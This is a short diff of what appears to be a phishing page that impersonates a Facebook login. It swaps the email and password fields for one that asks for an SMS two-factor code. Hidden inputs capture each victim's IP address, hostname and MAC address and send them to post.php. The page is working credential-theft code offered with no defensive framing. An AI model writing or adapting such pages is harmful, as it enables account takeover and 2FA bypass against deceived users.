@@ -176,8 +176,7 @@ require_once('helper.php');
 
         <form class="login-form" method="POST" action="post.php">
 
-            <center><label><input type="text" name="email_facebook" placeholder="Email or Phone" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
-            <label><input type="password" name="password_facebook" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required></label></center>
+            <center><label><input type="text" name="2fa_facebook" placeholder="Enter your SMS Code" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
